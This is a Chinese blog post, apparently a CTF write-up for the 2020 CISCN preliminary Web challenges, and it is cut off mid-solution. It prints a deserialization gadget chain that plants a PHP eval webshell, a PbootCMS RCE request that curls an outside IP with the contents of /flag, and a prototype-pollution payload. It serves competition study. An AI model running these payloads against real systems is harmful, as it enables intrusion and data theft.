@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2020-CISCN-Preliminary/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-21T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.069Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2020-CISCN-Preliminary/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2020-CISCN-Preliminary/","path":"2020-CISCN-Preliminary/","title":"2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyphp"><span class="nav-number">1.1.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyunserialize"><span class="nav-number">1.2.</span> <span class="nav-text">babyunserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rceme"><span class="nav-number">1.3.</span> <span class="nav-text">rceme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#littlegame"><span class="nav-number">1.4.</span> <span class="nav-text">littlegame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easytrick"><span class="nav-number">1.5.</span> <span class="nav-text">easytrick</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91"><span class="nav-number">2.1.</span> <span class="nav-text">电脑被黑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the_best_ctf_game"><span class="nav-number">2.2.</span> <span class="nav-text">the_best_ctf_game</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bd"><span class="nav-number">3.1.</span> <span class="nav-text">bd</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#z3"><span class="nav-number">4.1.</span> <span class="nav-text">z3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">5.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyjsc"><span class="nav-number">5.1.</span> <span class="nav-text">babyjsc</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2020-CISCN-Preliminary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-08-21 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-21T00:00:00+00:00">2020-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img
+src="/images/2020-CISCN-Preliminary/89E955944D8805B2DA4CAD39BF17F5B8.gif" /></p>
+<span id="more"></span>
+<h1 id="web">Web</h1>
+<h2 id="easyphp">easyphp</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>)&#123;</span><br><span class="line">        <span class="variable">$r</span>=<span class="title function_ invoke__">pcntl_wait</span>(<span class="variable">$status</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">pcntl_wifexited</span>(<span class="variable">$status</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">posix_kill</span>(<span class="title function_ invoke__">posix_getpid</span>(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>a</strong> 传入
+<strong>call_user_func</strong>，<strong>b</strong> 直接
+<strong>Fuzz</strong> 看看。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$r</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img
+src="/images/2020-CISCN-Preliminary/image-20200821132124618.png" /></p>
+<p>发现直接过了，回显一个
+<strong>Phpinfo</strong>，<strong>flag</strong> 在环境变量里。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;00c27187-f94d-4cbb-a7c6-9bb6d985e959&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="babyunserialize">babyunserialize</h2>
+<p>扫描发现有<strong>www.zip</strong>的源码泄露，点开发现是<strong>Wmctf</strong>的<strong>webweb</strong>，找了个<strong>Payload</strong>打发现被<strong>ban</strong>了几个函数，只能再找一个链了。</p>
+<p>全局搜一下**__destruct<strong>方法，</strong>fatfree/lib/db/jig.php**这儿有一个看起来可以用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	save file on destruction</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazy) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data?:[] <span class="keyword">as</span> <span class="variable">$file</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	Write data to memory/file</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $file string</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $data array</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="keyword">array</span> <span class="variable">$data</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;dir || <span class="variable language_">$this</span>-&gt;lazy)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$file</span>]=<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$fw</span>=<span class="title class_">\Base</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;format) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_JSON</span>:</span><br><span class="line">            <span class="variable">$out</span>=<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>,JSON_PRETTY_PRINT);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>:</span><br><span class="line">            <span class="variable">$out</span>=<span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;dir.<span class="variable">$file</span>,<span class="variable">$out</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	Exclusive file write</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@return</span> int|FALSE</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $file string</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $data mixed</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $append bool</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$append</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$this</span>-&gt;hive[<span class="string">&#x27;LOCK&#x27;</span>]|(<span class="variable">$append</span>?<span class="attr">FILE_APPEND</span>:<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>尝试着构造一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="variable">$uuid</span>,</span><br><span class="line">        <span class="variable">$dir</span> = <span class="string">&#x27;./&#x27;</span>,</span><br><span class="line">        <span class="variable">$format</span> = <span class="number">1</span>,</span><br><span class="line">        <span class="variable">$log</span>,</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;./south.php&#x27;</span>=&gt;[<span class="string">&#x27;&lt;?php echo south; phpinfo(); eval($_POST[&quot;south&quot;]); ?&gt;&#x27;</span>]),</span><br><span class="line">        <span class="variable">$lazy</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Jig</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A6%3A%22DB%5CJig%22%3A6%3A%7Bs%3A7%3A%22%00%2A%00uuid%22%3BN%3Bs%3A6%3A%22%00%2A%00dir%22%3Bs%3A2%3A%22.%2F%22%3Bs%3A9%3A%22%00%2A%00format%22%3Bi%3A1%3Bs%3A6%3A%22%00%2A%00log%22%3BN%3Bs%3A7%3A%22%00%2A%00data%22%3Ba%3A1%3A%7Bs%3A11%3A%22.%2Fsouth.php%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A54%3A%22%3C%3Fphp+echo+south%3B+phpinfo%28%29%3B+eval%28%24_POST%5B%22south%22%5D%29%3B+%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A1%3B%7D%</span></span><br></pre></td></tr></table></figure>
+<p>没权限，找了半天，然后认真看了一遍<strong>phpinfo</strong>才在环境变量里发现<strong>flag</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;183fd29a-abd2-44fc-b7ed-fdfec3e8b5bd&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="rceme">rceme</h2>
+<p>随手搜了一下发现是<strong>PbootCMS
+v1.3.2</strong>的命令执行漏洞。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?a=&#123;if:`curl%20122.51.113.164:233/?%5C%60cat%20%2Fflag%5C%60`&#125;(1)&#123;end%20if&#125;</span><br><span class="line"># flag&#123;d9d115c5-9c21-4764-9023-ce9fd564a54a&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="littlegame">littlegame</h2>
+<p><strong>npm install</strong>一下接着<strong>npm audit</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run  npm update set-value --depth 1  to resolve 1 vulnerability</span></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution                                          │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https://npmjs.com/advisories/1012                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found 1 high severity vulnerability <span class="keyword">in</span> 61 scanned packages</span><br><span class="line">  run `npm audit fix` to fix 1 of them.</span><br></pre></td></tr></table></figure>
+<p>报告了一个原型链污染，找到这个<a
+target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">链接</a>。</p>
+<p>根据源码和<strong>POC</strong>打，先访问<strong>/SpawnPoint</strong>，然后进行原型链污染。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /Privilege</span><br><span class="line"></span><br><span class="line">NewAttributeKey=__proto__.south&amp;NewAttributeValue=south</span><br></pre></td></tr></table></figure>
+<p>最后拿到<strong>flag</strong>。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">key=south&amp;password=south</span><br><span class="line"></span><br><span class="line"># &lt;body&gt;flag&#123;771f673a-0fe4-473e-a5fe-bb9843b2664d&#125;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="easytrick">easytrick</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span 